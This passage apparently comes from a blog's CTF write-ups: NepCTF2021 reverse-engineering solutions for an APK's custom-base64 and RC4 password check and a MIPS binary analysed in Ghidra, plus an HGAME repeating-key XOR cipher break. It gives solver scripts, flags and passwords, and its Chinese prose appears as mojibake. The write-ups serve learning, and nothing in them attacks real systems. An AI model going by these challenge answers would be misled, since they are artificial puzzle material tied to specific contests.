ï¼‰ã€‚åˆ°äº† sub_820 å‡½æ•°ï¼Œåˆ™æ¯å…­ä¸ªè¿›è¡Œåˆå¹¶ï¼Œæ¯ä¸€ä½è¿ç®—çœ‹èµ·æ¥å¾ˆå¥‡æ€ªï¼Œä½†å¦‚æœç”¨ 0x30 å’Œ 0x31 å¸¦å…¥ä¼šå‘ç°å°±æ˜¯å¾ˆç®€å•çš„å°† 0 å’Œ1 é‡æ–°ç»„åˆèµ·æ¥ã€‚å°±æ˜¯åšäº†ä¸€ä¸ª base64 è¿ç®—ã€‚\näºæ˜¯å†™ä¸ªä»£ç åå‘æ±‚è§£å°±å¯ä»¥äº†\nimport string from libnum import s2n import base64 en_key = \u0026#39;7+RmFXP2LWP2L6g3\u0026#39;[::-1] + \u0026#39;==qi7esi\u0026#39;[::-1] true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; fake_base = string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; + string.ascii_uppercase key = \u0026#39;\u0026#39; for c in en_key: if c == \u0026#39;=\u0026#39;: key += c continue key += true_base[fake_base.index(c)] key = base64.b64decode(key) print(key) å¾—åˆ° key: th1s_1s_k3y!!!!!\nè¿™é‡Œæˆ‘å› ä¸ºæ‰“é”™äº†baseçš„å­—ç¬¦ä¸²ï¼Œå¡äº†æ•´æ•´ä¸€å¤©ï¼ˆ\næ¥ä¸‹æ¥å°±å¯ä»¥å»æ±‚æ˜æ–‡å¯†ç äº†\nç»§ç»­é˜…è¯» java ä»£ç \npublic class Encrypt { public Encrypt() { super(); } public void en1(int[] arg6, String arg7, int arg8) { int v0 = 0x100; byte[] v1 = new byte[v0]; byte[] v7 = arg7.getBytes(); int v2 = 0; int v3; for(v3 = 0; v3 \u0026lt; v0; ++v3) { arg6[v3] = 0x100 - v3; // 256-1é™åº v1[v3] = v7[v3 % arg8]; // ç”¨å¯†é’¥å¡«æ»¡v1 } int v7_1 = 0; while(v2 \u0026lt; v0) { v7_1 = (arg6[v2] + v7_1 + v1[v2]) % 0x100; arg8 = arg6[v2]; arg6[v2] = arg6[v7_1]; arg6[v7_1] = arg8; ++v2; } } public void en2(int[] arg7, byte[] arg8, int arg9) { int v0 = 0; int v1 = 0; int v2 = 0; while(v0 \u0026lt; arg9) { v1 = (v1 + 1) % 0x100; v2 = ((arg7[v1] \u0026amp; 0xFF) + v2) % 0x100; int v3 = arg7[v1]; arg7[v1] = arg7[v2]; arg7[v2] = v3; arg8[v0] = ((byte)(arg8[v0] ^ arg7[((arg7[v1] \u0026amp; 0xFF) + (arg7[v2] \u0026amp; 0xFF)) % 0x100])); ++v0; } } public boolean file(byte[] arg6, String arg7) { // passwd, key = \u0026#39;th1s_1s_k3ya!!!!\u0026#39; int[] v0 = new int[0x100]; int v1 = 17; int[] v2 = new int[]{0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45}; this.en1(v0, arg7, arg7.length()); this.en2(v0, arg6, arg6.length); if(arg6.length != v1) { return 0; } int v7; for(v7 = 0; v7 \u0026lt; v1; ++v7) { if((arg6[v7] \u0026amp; 0xFF) != v2[v7]) { return 0; } } return 1; } } æ‡‚çš„è¯å°±ä¼šå‘ç°è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªsç›’ä» 0-255 å˜æˆ 256-1 çš„ RC4 å¯†ç \nä¸æ‡‚çš„è¯ç›´æ¥æŠŠä»£ç å¤åˆ¶å‡ºæ¥ï¼ŒæŠŠ file å‡½æ•°æ”¹å†™æˆ main å‡½æ•°ï¼Œåå‘æ±‚è§£ä¸€ä¸‹å°±è¡Œï¼ˆå› ä¸ºä»”ç»†è§‚å¯Ÿå°±å¯ä»¥å‘ç° en2 åªå¯¹æ˜æ–‡åšäº†ä¸ªå¼‚æˆ–è¿ç®—ï¼Œä¸”å¼‚æˆ–çš„å¯¹è±¡å’Œæ˜æ–‡æœ¬èº«æ²¡æœ‰å…³ç³»ï¼‰ï¼Œè¿™é‡Œå½“å¯†ç å­¦çš„é¢˜æ¥åšå…¶å®å°±å¥½äº†ã€‚\nè¿™æ˜¯æˆ‘å¤åˆ¶åæ”¹å†™çš„ java ä»£ç \npublic class Main { public static void en1(int[] arg6, String arg7, int arg8) { int v0 = 0x100; byte[] v1 = new byte[v0]; byte[] v7 = arg7.getBytes(); int v2 = 0; int v3; for(v3 = 0; v3 \u0026lt; v0; ++v3) { arg6[v3] = 0x100 - v3; // 256-1é™åº v1[v3] = v7[v3 % arg8]; // ç”¨å¯†é’¥å¡«æ»¡v1 } int v7_1 = 0; while(v2 \u0026lt; v0) { v7_1 = (arg6[v2] + v7_1 + v1[v2]) % 0x100; arg8 = arg6[v2]; arg6[v2] = arg6[v7_1]; arg6[v7_1] = arg8; ++v2; } } public static void en2(int[] arg7, int[] arg8, int arg9) { int v0 = 0; int v1 = 0; int v2 = 0; while(v0 \u0026lt; arg9) { v1 = (v1 + 1) % 0x100; v2 = ((arg7[v1] \u0026amp; 0xFF) + v2) % 0x100; int v3 = arg7[v1]; arg7[v1] = arg7[v2]; arg7[v2] = v3; arg8[v0] = ((byte)(arg8[v0] ^ arg7[((arg7[v1] \u0026amp; 0xFF) + (arg7[v2] \u0026amp; 0xFF)) % 0x100])); ++v0; } } public static void main(String[] args) { String arg7 = \u0026#34;th1s_1s_k3y!!!!!\u0026#34;; int[] arg6 = new int[]{0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45}; int[] v0 = new int[0x100]; int v1 = 17; int[] v2 = new int[]{}; en1(v0, arg7, arg7.length()); en2(v0, arg6, arg6.length); for (int i = 0; i \u0026lt; arg6.length; i++) { System.out.print((char)(arg6[i] \u0026amp; 0xff)); } } } å½“ç„¶ä¹Ÿå¯ä»¥è·Ÿåœ¨ç¬¬ä¸€æ®µ python åé¢ç»§ç»­å†™\nimport string from libnum import s2n import base64 en_key = \u0026#39;7+RmFXP2LWP2L6g3\u0026#39;[::-1] + \u0026#39;==qi7esi\u0026#39;[::-1] true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; fake_base = string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; + string.ascii_uppercase key = \u0026#39;\u0026#39; for c in en_key: if c == \u0026#39;=\u0026#39;: key += c continue key += true_base[fake_base.index(c)] key = base64.b64decode(key) print(key) # th1s_1s_k3y!!!!! ciphertext = [0x8B, 0xD2, 0xD9, 0x5D, 0x95, 0xFF, 0x7E, 0x5F, 0x29, 0x56, 0x12, 0xB9, 0xEF, 0xEC, 0x8B, 0xD0, 0x45] def en1(key, len_key): res = [] v0 = 0x100 v1 = [0] * v0 v7 = [c for c in key] v2 = 0 for v3 in range(v0): res.append(0x100 - v3) v1[v3] = v7[v3 % len_key] v7_1 = 0 while v2 \u0026lt; v0: v7_1 = (res[v2] + v7_1 + v1[v2]) % 0x100 len_key = res[v2] res[v2] = res[v7_1] res[v7_1] = len_key v2 += 1 return res def en2(res_key, text, len_text): v0 = 0 v1 = 0 v2 = 0 # text = bytes(text) while v0 \u0026lt; len_text: v1 = (v1 + 1) % 0x100 v2 = ((res_key[v1] \u0026amp; 0xFF) + v2) % 0x100 v3 = res_key[v1] res_key[v1] = res_key[v2] res_key[v2] = v3 text[v0] = ((text[v0] ^ res_key[((res_key[v1] \u0026amp; 0xFF) + (res_key[v2] \u0026amp; 0xFF)) % 0x100])) v0 += 1 return text list_key = en1(key[:], len(key)) plaintext = en2(list_key[:], ciphertext[:], len(ciphertext)) print (plaintext) flag = \u0026#39;\u0026#39; for c in plaintext: flag += chr(c) print (flag) è¿™æ ·å°±æ‹¿åˆ°å¯†ç äº† Y0uG3tTheP4ssw0rd\nç„¶åå°† apk è§£å‹ä¸€ä¸‹ï¼ˆç”¨çš„ bandizipï¼Œå¯ä»¥ç›´æ¥è§£å‹ï¼‰ï¼Œåœ¨ç›®å½•ä¸‹é¢å¯ä»¥æ‰¾åˆ° \\assets\\flag.zip\nè§£å‹å³å¯æ‹¿åˆ° flag\neasy_mips ï¼ˆmips é€†å‘ï¼‰ è¿™æ˜¯ä¸€é“mipsçš„é¢˜ï¼Œç”¨idaæ— æ³•åæ±‡ç¼–ï¼Œçˆ¬äº†\nå…ˆç”¨idaçš„å­—ç¬¦ä¸²æœç´¢æ‰¾åˆ°äº†å…³é”®ä»£ç åœ¨ tty_write å‡½æ•°é‡Œï¼Œå¹¶ä¸”è°ƒç”¨äº† encry å‡½æ•°å’Œ init å‡½æ•°ï¼Œä½†å› ä¸ºæ²¡å­¦è¿‡mipsï¼Œä¹Ÿå°±æ²¡æ³•ç»§ç»­åˆ†æäº†\näºæ˜¯ç¬¬ä¸€æ¬¡å°è¯•ä½¿ç”¨ Ghidra\nç”¨ Ghidra æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶\næ‰¾åˆ°å…³é”®å‡½æ•° tty_write\nvoid tty_write(char *param_1,char *param_2) { int __fd; size_t __n; int iVar1; EVP_PKEY_CTX aEStack56 [20]; undefined4 local_24; undefined4 local_20; undefined4 local_1c; undefined4 local_18; undefined4 local_14; char local_10; int local_c; local_c = __stack_chk_guard; local_24 = 0x666c6167; local_20 = 0x7b69745f; local_1c = 0x69735f5f; local_18 = 0x5f5f6661; local_14 = 0x6b657d0a; local_10 = \u0026#39;\\0\u0026#39;; __fd = open(param_1,2); if (__fd \u0026lt; 0) { printf(\u0026#34;cannot open\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } __n = strlen(param_2); write(__fd,param_2,__n); read(__fd,aEStack56,0x13); encry(aEStack56); iVar1 = strcmp((char *)aEStack56,(char *)\u0026amp;local_24); if (iVar1 == 0) { write(__fd,\u0026#34;you get the fake flag\\n\u0026#34;,0x16); } else { iVar1 = strcmp((char *)aEStack56,\u0026#34;3_isjA0UeQZcNa\\\\`\\\\Vf\u0026#34;); if (iVar1 != 0) { puts(\u0026#34;you_don\\\u0026#39;t_get_the_flag\u0026#34;); goto LAB_00400b48; } write(__fd,\u0026#34;good_job!\\n\u0026#34;,10); } close(__fd); LAB_00400b48: if (local_c != __stack_chk_guard) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } ä¹‹å‰åœ¨ ida ä¸­å‘ç° local_24 æ˜¯ä¸€ä¸ªfake flagï¼Œå°±ä¸ç®¡äº†\nå‘ç°è°ƒç”¨äº†ä¸€ä¸ª encry å‡½æ•°ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°\nvoid encry(EVP_PKEY_CTX *param_1) { char cVar1; int local_10; init(param_1); cVar1 = \u0026#39;\\x05\u0026#39;; local_10 = 0; while (local_10 \u0026lt; 0x13) { param_1[local_10] = (EVP_PKEY_CTX)((char)param_1[local_10] - cVar1); cVar1 = cVar1 + \u0026#39;\\x01\u0026#39;; local_10 = local_10 + 1; } return; } å‘ç°å…ˆè°ƒç”¨äº† init å‡½æ•°ï¼Œç„¶åå¯¹æ¯ä¸€ä½åšäº†ä¸ªå‡æ³•\næŸ¥çœ‹ init å‡½æ•°\nint init(EVP_PKEY_CTX *ctx) { int iVar1; char extraout_var; char extraout_var_00; char extraout_var_01; int local_20; iVar1 = __stack_chk_guard; srand(0x1c5e); rand(); rand(); rand(); *ctx = (EVP_PKEY_CTX)((byte)*ctx ^ extraout_var + 0x32U); ctx[5] = (EVP_PKEY_CTX)((byte)ctx[5] ^ extraout_var_00 - 0x39U); ctx[6] = (EVP_PKEY_CTX)((byte)ctx[6] ^ extraout_var_01 + 0x30U); local_20 = 7; while (local_20 \u0026lt; 0xd) { local_20 = local_20 + 1; } if (iVar1 != __stack_chk_guard) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return __stack_chk_guard; } è¿™é‡Œè‡ªåŠ¨åˆ†æå‡ºç°äº†é—®é¢˜ï¼Œä¸çŸ¥é“ extraout_var å’Œ rand æœ‰ä»€ä¹ˆå…³ç³»\näºæ˜¯åªèƒ½å»æ‰¾å¯¹åº”çš„æ±‡ç¼–æ…¢æ…¢è¯»\næ ¹æ® Ghidra é‡Œä»£ç ä¸æ±‡ç¼–çš„æ˜ å°„å…³ç³»ï¼Œæ‰¾åˆ°äº† extraout_var çš„ä½ç½®\n00400d00 80 43 00 00 lb v1,0x0 (v0) 00400d04 8f c2 00 24 lw v0,local_1c (s8) 00400d08 30 42 00 ff andi v0,v0,0xff 00400d0c 24 42 00 32 addiu v0,v0,0x32 00400d10 30 42 00 ff andi v0,v0,0xff 00400d14 7c 02 14 20 seb v0,v0 00400d18 00 62 10 26 xor v0,v1,v0 00400d1c 7c 02 1c 20 seb v1,v0 00400d20 8f c2 00 1c lw v0,local_24 (s8) 00400d24 a0 43 00 00 sb v1,0x0 (v0) æ‰¾åˆ° addiu è¯´æ˜ v0 å¯¹åº”çš„å°±æ˜¯ extraout_varï¼Œå‘ç°æ˜¯ä» local_1c å¤„å–å‡ºçš„\nå¾€ä¸Šæ‰¾ local_1c\n00400c80 8f dc 00 10 lw gp,local_30 (s8) 00400c84 8f 82 80 44 lw v0,-0x7fbc (gp)=\u0026gt;-\u0026gt;rand = 004010e0 00400c88 00 40 c8 25 or t9,v0,zero 00400c8c 03 20 f8 09 jalr t9=\u0026gt;rand int rand(void) 00400c90 00 00 00 00 _nop 00400c94 8f dc 00 10 lw gp,local_30 (s8) 00400c98 00 40 18 25 or v1,v0,zero 00400c9c 83 c2 00 31 lb v0,local_10 +0x1 (s8) 00400ca0 00 62 10 26 xor v0,v1,v0 00400ca4 00 02 16 03 sra v0,v0,0x18 00400ca8 af c2 00 24 sw v0,local_1c (s8) ä»åå¾€å‰çœ‹ï¼Œæœ€åæ˜¯å°† v0 å­˜åˆ° local_1c ä¸­ï¼Œå€’æ•°ç¬¬äºŒæ­¥æ˜¯å°† v0 å³ç§» 0x18 ä½ï¼ˆè¿™é‡Œé—®äº†ä¸€ä¸‹ä¼šmipsçš„å¤§ä½¬\u0026hellip;ï¼‰ï¼Œè™½ç„¶æ²¡æ³•å®Œç¾åˆ†æå‡º rand çš„ç»“æœå­˜åˆ°äº†å“ªé‡Œï¼Œä½†æ˜¯å¯ä»¥çŒœæµ‹æœ€åå³ç§»äº† 0x18 ä½å¹¶å­˜åˆ°äº† local_1c ä¸­ã€‚\näºæ˜¯å°±å¯ä»¥å°è¯•ç¼–å†™ä»£ç ï¼Œç ´è§£flagäº†ã€‚\né¦–å…ˆè®¡ç®—å‡ ä¸ª rand çš„ç»“æœ\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(){ srand(0x1c5e); char a[20]; a[0] = \u0026#39;8\u0026#39;; printf(\u0026#34;%x\\n\u0026#34;, rand()); printf(\u0026#34;%x\\n\u0026#34;, rand()); printf(\u0026#34;%x\\n\u0026#34;, rand()); return 0; } è¿è¡Œå¾—åˆ°\n./test_rand 446aef60 5de30bb4 27445d71 éšåå†™ä¸ªåå‘çš„ç®—æ³•\nencry = b\u0026#39;3_isjA0UeQZcNa\\\\`\\\\Vf\u0026#39; flag_1 = [] t = 5 for i in encry: flag_1.append(i + t) t += 1 print (flag_1) rand = [0x44 + 0x32, 0,0,0,0,0x5d - 0x39, 0x27 + 0x30] + [0] * 15 flag = \u0026#39;\u0026#39; for i in range(len(flag_1)): flag += chr(flag_1[i] ^ (rand[i] \u0026amp; 0xff)) print (flag) å¾—åˆ°æœ€ç»ˆçš„flag\n[56, 101, 112, 123, 115, 75, 59, 97, 114, 95, 105, 115, 95, 115, 111, 116, 113, 108, 125] Nep{solar_is_sotql} worrrrms ï¼ˆgoè¯­è¨€é€†å‘ï¼‰ åªçŸ¥é“ç”¨äº†SM4ç®—æ³•åŠ å¯†ï¼Œä¸ä¼šgoè¯­è¨€ï¼Œå…·ä½“çš„çœ‹ä¸æ‡‚ï¼Œçˆ¬äº†ã€‚\næ€»ç»“ è¿™ä¸ªæ¯”èµ›çš„å‰äº”é“é¢˜å…¶å®å°±æ˜¯å„ä¸ªæ–¹å‘çš„å…¥é—¨é¢˜ç›®ï¼Œæœ‰ç›¸åº”çš„å·¥å…·å¹¶ä¸”èƒ½å¤Ÿçœ‹æ‡‚ä¼ªä»£ç å°±å¯ä»¥åšäº†ï¼Œåªéœ€è¦è¿›è¡Œé™æ€åˆ†æã€‚åšgoè¯­è¨€çš„æ—¶å€™å‘ç°goçš„å‡½æ•°è°ƒç”¨å¤ªå¥‡æ€ªäº†ï¼Œè€Œä¸”æœ‰å„ç§æŒ‡é’ˆï¼Œä¸æ„§æ˜¯æœ€å®‰å…¨çš„è¯­è¨€ã€‚\nè‡³äºåé¢çš„å‡ é“é¢˜ï¼Œç”±äºè§£çš„äººå¤ªå°‘ï¼Œä¹Ÿå°±æ²¡æœ‰å»çœ‹ï¼Œçœ‹å®Œwpå†è¡¥ã€‚\n","date":"2021-03-22T18:30:03Z","permalink":"/post/nepctf2021-re-writeups/","title":"NepCTF2021 re writeups"},{"content":"å¯¹ç§°ä¹‹ç¾ é¢˜ç›® Vernam å¯†ç \nimport random import string import itertools from secret import FLAG key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) cipher = bytes([ord(m)^ord(k) for m, k in zip(FLAG, itertools.cycle(key))]) print(cipher) æ€è·¯ ç”±äºç»™äº†å¤§é‡çš„å¯†æ–‡ï¼Œå®Œå…¨å¯ä»¥å¯¹å¯†é’¥ç©ºé—´è¿›è¡ŒèŒƒå›´ä¸Šçš„ç¼©å°ã€‚\nç”±äºè¿›è¡Œçš„æ˜¯å¼‚æˆ–æ“ä½œï¼Œä¸”æ˜æ–‡ä¸å¯†é’¥å‡ä¸ºå¯è§å­—ç¬¦ï¼Œåªéœ€è¦å¯¹ç›¸åŒä½ç½®çš„å¯†æ–‡ä¸æ‰€æœ‰å¯èƒ½çš„å¯†é’¥å­—ç¬¦è¿›è¡Œå¼‚æˆ–è®¡ç®—ï¼Œç»“æœä¸åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…çš„å‡å¯ä»¥æ’é™¤æ‰ã€‚\nç»è¿‡åˆæ­¥ç­›é€‰åå¯†é’¥ç©ºé—´ä¼šå°å¾ˆå¤šï¼Œè¿›è¡Œçˆ†ç ´æˆ–è€…æ ¹æ®ä¸Šä¸‹æ–‡æ‰‹åŠ¨é€‰æ‹©å³å¯ã€‚\nä»£ç  import string import itertools key = string.ascii_letters + string.digits # first = [94, 116, 57, 32, 54, 49, 33, 32, 54, 38, 116, 59, 37, 32, 32, 116, 60, 32, 57, 59, 51, 34, 38, 39, 116, 59, 116, 38, 60, 61, 35, 58, 39, 55, 59, 116, 49, 32, 48, 39, 55, 94, 59, 116, 38, 39, 116, 50, 59, 53, 48, 122, 60, 94, 116, 61, 54, 38, 38, 32, 39, 116, 56, 59, 53, 97, 1] # first = [35, 25, 21, 25, 17, 2, 28, 3, 5, 21, 17, 3, 5, 80, 80, 18, 25, 31, 21, 31, 94, 21, 80, 4, 24, 31, 17, 3, 17, 4, 80, 80, 25, 17, 3, 0, 9, 24, 9, 25, 24, 17, 30, 3, 9, 80, 17, 17, 2, 80, 31, 80, 80, 22, 3, 3, 25, 9, 21, 24, 80, 17, 21, 80, 23, 93, 62] # first = [78, 68, 89, 89, 91, 23, 83, 23, 67, 91, 89, 94, 82, 69, 78, 66, 89, 23, 67, 92, 23, 69, 67, 23, 86, 92, 89, 23, 83, 27, 67, 85, 84, 91, 82, 69, 25, 94, 23, 89, 94, 65, 23, 89, 23, 88, 23, 84, 23, 91, 64, 110, 68, 86, 78, 23, 91, 23, 23, 82, 61, 71, 68, 95, 13, 86, 89] # first = [43, 102, 50, 33, 39, 76, 102, 50, 102, 39, 34, 50, 53, 35, 41, 53, 34, 53, 52, 102, 76, 39, 46, 47, 52, 102, 37, 43, 102, 102, 46, 41, 39, 106, 102, 35, 102, 53, 49, 33, 40, 41, 50, 39, 54, 52, 42, 35, 76, 47, 40, 41, 47, 37, 43, 47, 39, 39, 36, 52, 34, 54, 53, 35, 102, 25, 63] # first = [3, 25, 29, 78, 0, 1, 12, 6, 7, 26, 78, 7, 64, 15, 27, 23, 78, 11, 23, 15, 58, 2, 7, 29, 10, 8, 7, 15, 100, 12, 15, 10, 2, 78, 1, 10, 100, 78, 6, 78, 9, 7, 6, 28, 15, 78, 1, 78, 15, 0, 78, 27, 10, 11, 3, 29, 26, 0, 1, 78, 7, 11, 78, 28, 100, 27, 49] # first = [31, 18, 90, 21, 25, 15, 31, 31, 14, 31, 112, 21, 112, 22, 8, 90, 14, 31, 90, 14, 18, 90, 9, 90, 87, 21, 31, 3, 27, 15, 14, 19, 22, 27, 28, 27, 46, 25, 31, 27, 90, 30, 31, 22, 25, 24, 21, 19, 20, 31, 14, 93, 31, 90, 31, 90, 31, 30, 14, 9, 12, 27, 14, 31, 18, 41, 57] # first = [69, 84, 94, 67, 84, 69, 17, 92, 17, 17, 94, 95, 104, 88, 17, 70, 89, 90, 70, 17, 84, 67, 31, 69, 70, 67, 95, 17, 17, 69, 17, 84, 72, 66, 17, 69, 89, 80, 69, 17, 85, 88, 17, 88, 90, 84, 90, 95, 85, 17, 89, 93, 66, 80, 69, 59, 67, 17, 89, 88, 88, 67, 89, 17, 86, 2, 0] # first = [65, 93, 85, 19, 19, 29, 71, 64, 80, 71, 71, 82, 92, 73, 81, 92, 86, 19, 91, 82, 65, 86, 19, 91, 90, 19, 71, 93, 93, 19, 71, 64, 19, 19, 67, 92, 86, 94, 91, 94, 90, 93, 94, 93, 19, 82, 19, 19, 19, 64, 86, 95, 19, 65, 65, 88, 82, 90, 19, 87, 87, 19, 86, 90, 82, 85, 67] # first = [49, 104, 104, 44, 45, 104, 32, 45, 41, 39, 32, 36, 61, 45, 58, 58, 104, 66, 45, 104, 45, 41, 28, 41, 58, 66, 104, 39, 41, 60, 32, 104, 59, 66, 39, 58, 58, 45, 45, 41, 38, 47, 45, 47, 39, 58, 41, 60, 33, 60, 104, 104, 39, 45, 33, 38, 36, 60, 59, 45, 33, 37, 104, 59, 37, 29, 0] # first = [119, 35, 93, 37, 54, 3, 50, 59, 57, 119, 50, 119, 119, 119, 54, 60, 36, 56, 57, 39, 119, 36, 63, 35, 50, 62, 54, 35, 58, 63, 50, 32, 46, 32, 35, 36, 50, 119, 37, 35, 57, 119, 57, 123, 49, 36, 35, 63, 58, 37, 93, 36, 49, 119, 52, 56, 119, 112, 62, 119, 57, 56, 36, 119, 50, 102, 100] # first = [57, 56, 49, 49, 51, 56, 112, 38, 112, 51, 34, 36, 61, 57, 57, 57, 51, 37, 112, 49, 49, 63, 53, 112, 52, 36, 62, 112, 53, 53, 57, 53, 61, 53, 53, 112, 54, 57, 112, 53, 53, 50, 37, 112, 112, 113, 112, 53, 49, 49, 61, 53, 112, 32, 49, 39, 35, 35, 52, 63, 55, 34, 49, 36, 43, 123, 34] # first = [87, 92, 25, 78, 81, 80, 86, 92, 88, 86, 25, 92, 88, 77, 87, 87, 92, 77, 64, 80, 75, 87, 25, 78, 25, 23, 90, 81, 25, 64, 75, 75, 84, 75, 87, 86, 86, 87, 51, 21, 75, 92, 25, 51, 78, 51, 64, 25, 94, 80, 80, 92, 64, 75, 85, 87, 64, 25, 92, 95, 25, 92, 84, 81, 97, 13, 68] # first = [65, 65, 17, 8, 65, 18, 3, 18, 13, 13, 2, 2, 24, 77, 65, 6, 15, 65, 14, 15, 4, 18, 107, 4, 21, 65, 4, 0, 7, 65, 65, 4, 4, 4, 21, 19, 19, 65, 2, 65, 65, 8, 14, 9, 14, 53, 14, 12, 8, 6, 5, 65, 14, 4, 79, 65, 12, 107, 18, 65, 13, 65, 4, 4, 81, 15, 107] # first = [57, 61, 57, 54, 55, 120, 50, 116, 43, 55, 55, 48, 120, 120, 82, 120, 61, 43, 45, 44, 120, 120, 62, 127, 55, 23, 43, 46, 55, 51, 82, 120, 44, 120, 49, 120, 61, 48, 48, 59, 55, 54, 62, 45, 52, 57, 45, 49, 54, 48, 60, 58, 45, 44, 120, 57, 53, 47, 120, 44, 49, 55, 118, 120, 42, 60] # first = [5, 27, 30, 16, 3, 20, 18, 87, 24, 5, 26, 25, 25, 21, 30, 21, 4, 14, 87, 30, 4, 17, 30, 5, 87, 2, 3, 18, 5, 25, 24, 21, 5, 3, 22, 7, 91, 22, 24, 22, 5, 16, 87, 25, 1, 28, 5, 5, 18, 3, 27, 24, 5, 3, 35, 4, 18, 31, 18, 31, 25, 5, 125, 17, 40, 83] # first = [38, 55, 60, 114, 58, 61, 49, 88, 114, 33, 34, 59, 61, 39, 33, 55, 114, 63, 62, 60, 55, 61, 32, 55, 62, 32, 61, 114, 114, 55, 37, 51, 59, 58, 62, 32, 114, 60, 61, 38, 114, 114, 51, 53, 55, 55, 114, 32, 114, 114, 55, 38, 114, 43, 58, 114, 38, 55, 59, 59, 55, 114, 1, 62, 59, 52] def test(char): for c in first: num = ord(char) ^ c if (num \u0026lt; 0x20 or 0x7f \u0026lt;= num) and num != 0x0a: # å¯èƒ½å‡ºç°æ¢è¡Œç¬¦ return False return True for c in key: if (test(c)): print (c, end = \u0026#39; \u0026#39;) print() # T # b d e k l o p q r s t u w x y final: p # 7 # F # n # z # b 1 # a c d e f g h i j k m n o p q r s t u v w x y z 0 1 2 3 4 5 7 9 final: 3 # H # W # C D E O P Q R S U V W final: P # k 9 # a # X # w # x R å°†å¯†æ–‡æ¯åå…­ä¸ªåˆ†ä¸€ç»„ï¼Œæ¯ä¸€ç»„ç›¸åŒä½ç½®å¯¹åº”çš„å¯†é’¥åº”è¯¥æ˜¯åŒä¸€ä¸ªï¼Œå› æ­¤å°†è¿™äº›å¯†æ–‡å­—ç¬¦ç»„æˆä¸€ä¸ª listï¼Œè¿™é‡Œå‘½åä¸º firstã€‚\nå¯¹æ¯ä¸€ä¸ªä½ç½®è¿›è¡Œå¯†é’¥çš„åˆç­›ï¼Œæœ€ç»ˆå¯ä»¥å¾—åˆ°ä»£ç å—ä¸‹é¢çš„æ³¨é‡Šæ‰€ç¤ºçš„å¯†é’¥ç©ºé—´\néšä¾¿é€‰æ‹©ä¸€ç»„å¯†é’¥è¿›è¡Œè§£å¯†è¿ç®—\nkey = \u0026#39;Tp7Fnz13HWP9aXwR\u0026#39; a = (bytes([m ^ ord(k) for m, k in zip(cipher, itertools.cycle(key))])) print (a) å¯¹è¿™äº›å¯†é’¥è¿›è¡Œæ‰‹åŠ¨ç­›æŸ¥å¹¶æ›´æ–°å¯†é’¥å³å¯ï¼Œè¿‡ç¨‹å¦‚ä¸‹ã€‚\nb\u0026#39;\\nLymmet y zn Art vs whe\u0026lt; t{e Elemznts o4 \\nr pAintvng orrdrrwiNg b~lancereaph Othem \\nout| T{is\\x00cousd be \u0026amp;he3obJectl them!elees\\x0c \\nbjt it 1an3alSo rzlate \u0026amp;o polOrs ~nd \\no\u0026amp;hea cOmpolition3l gecHniqjes.\\nY=u ~ay\\x00not?reali(e zt,\\x00but?your 0razn *is }usy w=rkzng\\x00behvnd th7 spenEs tp seekr\\noft Symmztry w:en3yoU lopk at 3 prinTing1 \\nThe e rre\\x00sevzral r7as|ns\\x00for?this.rThv \\nFirsk is t:at3we\\x07re ward-w;rew tO lopk forr\\nig. our ~ncien\u0026amp; a}ceStorl may \u0026lt;ot3haVe h~d \\na \u0026lt;amv fOr ik, butrthvy Knew?that \u0026amp;hezr *own?bodie! wvre\\x00basvcallyrsy~meTric~l, asr\\nwvre\\x00thole of \u0026#34;otvntIal oredat=rs3or\\x00pref. \\nTh7reuorE, twis ca?e zn Handf whet:er3\\ncHoosvng a ?atv, Catcwing d;nnvr Or \\n~voidi\u0026lt;g qeiNg oq the ?enf oF a lnarli\u0026lt;g,3\\nhUngrf packrof3woLves?or be3rs2\\nTAke ~ lookrat3yoUr f~ce inrthv mIrrom \\nandrimrgiNe a?line !trrigHt dpwn th7 \\n~idDle.?You\\\u0026#39;l\u0026gt; sve Both?sidesrof3yoUr \\nyace a e creTty lymmet icrl.\\x00Thil is \\n9nodn As bvlater3l `ymMetrf and ;t\\\u0026#39;` \\nWherz bothrsiwes\\x00eitwer si6e |f This?\\ndivi6int lIne ~ppearrmoae Or lzss th7 srme\\x0e\\nSo?here ;s ghe\\x00flax: \\nhg3mehX0R_i52a_uS34U184nD$fUQny_C1\u0026#34;H3a}\\n\u0026#39; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;x\u0026#39;) ^ ord(\u0026#39;o\u0026#39;) ^ ord(\u0026#39;g\u0026#39;) 112 \u0026gt;\u0026gt;\u0026gt; chr(112) \u0026#39;p\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#39;\\nSymmet y zn Art is whe\u0026lt; t{e Elements o4 \\nr pAinting orrdrrwiNg balancereaph Other \\nout| T{is\\x00could be \u0026amp;he3obJects them!elees\\x0c \\nbut it 1an3alSo relate \u0026amp;o polOrs and \\no\u0026amp;hea cOmposition3l gecHniques.\\nY=u ~ay\\x00not reali(e zt,\\x00but your 0razn *is busy w=rkzng\\x00behind th7 spenEs to seekr\\noft Symmetry w:en3yoU look at 3 prinTing. \\nThe e rre\\x00several r7as|ns\\x00for this.rThv \\nFirst is 